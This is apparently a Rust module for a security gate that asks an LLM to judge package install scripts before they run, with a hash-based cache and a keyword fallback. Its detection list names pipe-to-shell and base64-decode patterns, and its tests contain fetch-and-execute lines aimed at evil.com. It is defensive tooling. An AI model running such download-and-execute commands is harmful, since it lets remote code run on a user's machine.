use std::collections::HashMap;
use std::path::Path;
use std::sync::Mutex;

use anyhow::{Context, Result};
use sha2::{Digest, Sha256};
use tracing::{debug, info, warn};

use crate::backend::LlmBackend;
use crate::client::{ApiResponse, ContentBlock, Message};
use crate::skill::SkillSpec;

// ---------------------------------------------------------------------------
// GateVerdict
// ---------------------------------------------------------------------------

/// The result of a pre-execution gate analysis.
#[derive(Debug, Clone)]
pub struct GateVerdict {
    pub allowed: bool,
    pub confidence: f64,
    pub explanation: String,
}

// ---------------------------------------------------------------------------
// GateAllowlist — in-memory cache
// ---------------------------------------------------------------------------

/// Simple in-memory cache mapping (package_name, script_hash) to allow/block.
///
/// This will be migrated to SQLite persistence in a later task.
pub struct GateAllowlist {
    /// Map from (package_name, script_hash) -> allowed: bool
    entries: Mutex<HashMap<(String, String), bool>>,
}

impl GateAllowlist {
    pub fn new() -> Self {
        Self {
            entries: Mutex::new(HashMap::new()),
        }
    }

    /// Check if a (package, hash) pair has a cached decision.
    ///
    /// Returns `Some(true)` for allowed, `Some(false)` for blocked, `None` for
    /// unknown.
    pub fn check(&self, package: &str, script_hash: &str) -> Option<bool> {
        let entries = self.entries.lock().expect("allowlist lock poisoned");
        entries
            .get(&(package.to_string(), script_hash.to_string()))
            .copied()
    }

    /// Record that the given (package, hash) is allowed.
    pub fn allow(&self, package: &str, script_hash: &str) {
        let mut entries = self.entries.lock().expect("allowlist lock poisoned");
        entries.insert(
            (package.to_string(), script_hash.to_string()),
            true,
        );
    }

    /// Record that the given (package, hash) is blocked.
    pub fn block(&self, package: &str, script_hash: &str) {
        let mut entries = self.entries.lock().expect("allowlist lock poisoned");
        entries.insert(
            (package.to_string(), script_hash.to_string()),
            false,
        );
    }
}

impl Default for GateAllowlist {
    fn default() -> Self {
        Self::new()
    }
}

// ---------------------------------------------------------------------------
// GateAnalyzer
// ---------------------------------------------------------------------------

/// Pre-execution gate analyzer that reads script content and decides
/// allow/block via a single-shot LLM call (no agent loop, no tools).
pub struct GateAnalyzer {
    client: Box<dyn LlmBackend>,
    skill: SkillSpec,
    allowlist: GateAllowlist,
    timeout_ms: u64,
}

impl GateAnalyzer {
    pub fn new(client: Box<dyn LlmBackend>, skill: SkillSpec, timeout_ms: u64) -> Self {
        Self {
            client,
            skill,
            allowlist: GateAllowlist::new(),
            timeout_ms,
        }
    }

    /// Analyze a script before execution and return a gate verdict.
    ///
    /// 1. Compute SHA-256 hash of script content
    /// 2. Check allowlist — if (package, hash) is known, return cached result
    /// 3. Read script content from `script_path`
    /// 4. Send to LLM with the gate-analyzer skill's system prompt
    /// 5. Parse response into GateVerdict
    /// 6. Cache the result in the allowlist
    /// 7. Return verdict
    pub async fn analyze_script(
        &self,
        script_path: &str,
        package_name: &str,
        package_context: &str,
    ) -> Result<GateVerdict> {
        // Read script content.
        let script_content = match std::fs::read_to_string(Path::new(script_path)) {
            Ok(content) => content,
            Err(e) => {
                warn!(
                    path = %script_path,
                    error = %e,
                    "failed to read script, applying fallback analysis"
                );
                // If we can't read the script, block by default.
                return Ok(GateVerdict {
                    allowed: false,
                    confidence: 0.5,
                    explanation: format!("Could not read script at {script_path}: {e}"),
                });
            }
        };

        // Compute SHA-256 hash.
        let script_hash = sha256_hex(&script_content);

        // Check allowlist cache.
        if let Some(allowed) = self.allowlist.check(package_name, &script_hash) {
            debug!(
                package = %package_name,
                hash = %script_hash,
                allowed,
                "allowlist cache hit"
            );
            let explanation = if allowed {
                "Previously allowed (cached)".to_string()
            } else {
                "Previously blocked (cached)".to_string()
            };
            return Ok(GateVerdict {
                allowed,
                confidence: 1.0,
                explanation,
            });
        }

        info!(
            package = %package_name,
            hash = %script_hash,
            "analyzing script with LLM"
        );

        // Build user message.
        let user_text = format!(
            "Analyze this {package_context} script for package '{package_name}':\n\n```\n{script_content}\n```"
        );
        let messages = vec![Message {
            role: "user".to_string(),
            content: vec![ContentBlock::Text { text: user_text }],
        }];

        // Send to LLM with timeout.
        let api_result = tokio::time::timeout(
            std::time::Duration::from_millis(self.timeout_ms),
            self.client.send_message(
                &self.skill.system_prompt,
                &messages,
                &[],  // no tools for gate analysis
                Some(&self.skill.output_schema),
            ),
        )
        .await;

        let verdict = match api_result {
            Ok(Ok(response)) => {
                match response {
                    ApiResponse::EndTurn { content } => {
                        match parse_gate_response(&content) {
                            Ok(v) => v,
                            Err(e) => {
                                warn!(
                                    error = %e,
                                    "failed to parse LLM gate response, falling back to heuristics"
                                );
                                fallback_analysis(&script_content)
                            }
                        }
                    }
                    ApiResponse::ToolUse { .. } => {
                        warn!("LLM unexpectedly requested tool use in gate analysis, falling back");
                        fallback_analysis(&script_content)
                    }
                }
            }
            Ok(Err(e)) => {
                warn!(
                    error = %e,
                    "LLM API call failed, falling back to heuristic analysis"
                );
                fallback_analysis(&script_content)
            }
            Err(_) => {
                warn!(
                    timeout_ms = self.timeout_ms,
                    "LLM gate analysis timed out, falling back to heuristic analysis"
                );
                fallback_analysis(&script_content)
            }
        };

        // Cache the result.
        if verdict.allowed {
            self.allowlist.allow(package_name, &script_hash);
        } else {
            self.allowlist.block(package_name, &script_hash);
        }

        Ok(verdict)
    }
}

// ---------------------------------------------------------------------------
// Response parsing
// ---------------------------------------------------------------------------

/// Intermediate struct for deserializing the LLM's gate analysis JSON.
#[derive(Debug, serde::Deserialize)]
struct RawGateResponse {
    #[allow(dead_code)]
    classification: String,
    confidence: f64,
    recommended_action: String,
    explanation: String,
}

/// Parse the LLM's JSON response into a [`GateVerdict`].
fn parse_gate_response(content: &str) -> Result<GateVerdict> {
    let raw: RawGateResponse =
        serde_json::from_str(content).context("failed to parse LLM gate response JSON")?;

    let allowed = match raw.recommended_action.as_str() {
        "allow" => true,
        "block" => false,
        other => {
            warn!(action = %other, "unknown recommended_action, defaulting to block");
            false
        }
    };

    Ok(GateVerdict {
        allowed,
        confidence: raw.confidence.clamp(0.0, 1.0),
        explanation: raw.explanation,
    })
}

// ---------------------------------------------------------------------------
// Heuristic fallback
// ---------------------------------------------------------------------------

/// Suspicious patterns that indicate potentially malicious scripts.
const SUSPICIOUS_PATTERNS: &[&str] = &[
    "base64 -d",
    "base64 --decode",
    "curl | sh",
    "curl |sh",
    "curl|sh",
    "wget -O- |",
    "wget -O-|",
    "wget -qO- |",
    "wget -qO-|",
    "\\x",
    "| bash",
    "|bash",
    "| sh",
    "|sh",
];

/// Patterns that are suspicious only when combined with other indicators.
const EVAL_PATTERNS: &[&str] = &[
    "eval(",
    "python -c",
    "python3 -c",
    "node -e",
];

/// Heuristic fallback analysis when the LLM is unavailable.
///
/// Checks for well-known suspicious patterns. If any are found, the script is
/// blocked. Otherwise it is assumed safe.
pub fn fallback_analysis(script_content: &str) -> GateVerdict {
    let lower = script_content.to_lowercase();

    let mut found_patterns: Vec<&str> = Vec::new();
    for pattern in SUSPICIOUS_PATTERNS.iter().chain(EVAL_PATTERNS.iter()) {
        if lower.contains(*pattern) {
            found_patterns.push(pattern);
        }
    }

    if found_patterns.is_empty() {
        GateVerdict {
            allowed: true,
            confidence: 0.6,
            explanation: "Heuristic fallback: no suspicious patterns detected".to_string(),
        }
    } else {
        GateVerdict {
            allowed: false,
            confidence: 0.8,
            explanation: format!(
                "Heuristic fallback: suspicious patterns detected: {}",
                found_patterns.join(", ")
            ),
        }
    }
}

// ---------------------------------------------------------------------------
// Utilities
// ---------------------------------------------------------------------------

/// Compute the hex-encoded SHA-256 hash of the given content.
pub fn sha256_hex(content: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(content.as_bytes());
    let result = hasher.finalize();
    hex_encode(&result)
}

/// Encode bytes as a lowercase hex string.
fn hex_encode(bytes: &[u8]) -> String {
    use std::fmt::Write;
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        let _ = write!(s, "{b:02x}");
    }
    s
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // -- Allowlist tests ------------------------------------------------------

    #[test]
    fn allowlist_cache_hit_allowed() {
        let allowlist = GateAllowlist::new();
        allowlist.allow("my-package", "abc123hash");
        assert_eq!(allowlist.check("my-package", "abc123hash"), Some(true));
    }

    #[test]
    fn allowlist_cache_hit_blocked() {
        let allowlist = GateAllowlist::new();
        allowlist.block("evil-pkg", "def456hash");
        assert_eq!(allowlist.check("evil-pkg", "def456hash"), Some(false));
    }

    #[test]
    fn allowlist_cache_miss() {
        let allowlist = GateAllowlist::new();
        assert_eq!(allowlist.check("unknown-pkg", "somehash"), None);
    }

    // -- Fallback analysis tests ----------------------------------------------

    #[test]
    fn fallback_blocks_curl_pipe_sh() {
        let script = "#!/bin/bash\ncurl http://evil.com/payload.sh | sh\n";
        let verdict = fallback_analysis(script);
        assert!(!verdict.allowed);
        assert!(verdict.explanation.contains("suspicious patterns"));
    }

    #[test]
    fn fallback_blocks_base64_decode() {
        let script = "#!/bin/bash\ndata=$(echo \"bWFsd2FyZQ==\" | base64 -d)\n";
        let verdict = fallback_analysis(script);
        assert!(!verdict.allowed);
        assert!(verdict.explanation.contains("base64 -d"));
    }

    #[test]
    fn fallback_allows_normal_build_script() {
        let script = "#!/bin/bash\nnode-gyp rebuild\n";
        let verdict = fallback_analysis(script);
        assert!(verdict.allowed);
        assert!(verdict.explanation.contains("no suspicious patterns"));
    }

    #[test]
    fn fallback_allows_cmake_build() {
        let script = "#!/bin/bash\nmkdir -p build\ncd build\ncmake ..\nmake -j$(nproc)\nmake install\n";
        let verdict = fallback_analysis(script);
        assert!(verdict.allowed);
    }

    #[test]
    fn fallback_blocks_wget_pipe() {
        let script = "#!/bin/bash\nwget -O- http://evil.com/payload | bash\n";
        let verdict = fallback_analysis(script);
        assert!(!verdict.allowed);
        assert!(verdict.explanation.contains("suspicious patterns"));
    }

    #[test]
    fn fallback_blocks_hex_escapes() {
        let script = "#!/bin/bash\necho -e \"\\x48\\x65\\x6c\\x6c\\x6f\" > /tmp/payload\n";
        let verdict = fallback_analysis(script);
        assert!(!verdict.allowed);
        assert!(verdict.explanation.contains("\\x"));
    }

    // -- SHA-256 hashing test -------------------------------------------------

    #[test]
    fn sha256_known_value() {
        // SHA-256 of "hello" is well-known.
        let hash = sha256_hex("hello");
        assert_eq!(
            hash,
            "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
        );
    }

    #[test]
    fn sha256_different_inputs_different_hashes() {
        let h1 = sha256_hex("script A");
        let h2 = sha256_hex("script B");
        assert_ne!(h1, h2);
    }

    // -- parse_gate_response tests --------------------------------------------

    #[test]
    fn parse_gate_response_allow() {
        let json = serde_json::json!({
            "classification": "safe",
            "confidence": 0.95,
            "recommended_action": "allow",
            "explanation": "Normal build script"
        })
        .to_string();

        let verdict = parse_gate_response(&json).unwrap();
        assert!(verdict.allowed);
        assert!((verdict.confidence - 0.95).abs() < f64::EPSILON);
        assert_eq!(verdict.explanation, "Normal build script");
    }

    #[test]
    fn parse_gate_response_block() {
        let json = serde_json::json!({
            "classification": "malicious",
            "confidence": 0.9,
            "recommended_action": "block",
            "explanation": "Exfiltrates SSH keys"
        })
        .to_string();

        let verdict = parse_gate_response(&json).unwrap();
        assert!(!verdict.allowed);
        assert!((verdict.confidence - 0.9).abs() < f64::EPSILON);
        assert_eq!(verdict.explanation, "Exfiltrates SSH keys");
    }

    #[test]
    fn parse_gate_response_clamps_confidence() {
        let json = serde_json::json!({
            "classification": "safe",
            "confidence": 1.5,
            "recommended_action": "allow",
            "explanation": "over-confident"
        })
        .to_string();

        let verdict = parse_gate_response(&json).unwrap();
        assert!((verdict.confidence - 1.0).abs() < f64::EPSILON);
    }

    #[test]
    fn parse_gate_response_invalid_json() {
        let result = parse_gate_response("not json");
        assert!(result.is_err());
    }

    #[test]
    fn parse_gate_response_unknown_action_defaults_block() {
        let json = serde_json::json!({
            "classification": "suspicious",
            "confidence": 0.7,
            "recommended_action": "quarantine",
            "explanation": "Unknown action test"
        })
        .to_string();

        let verdict = parse_gate_response(&json).unwrap();
        assert!(!verdict.allowed);
    }
}
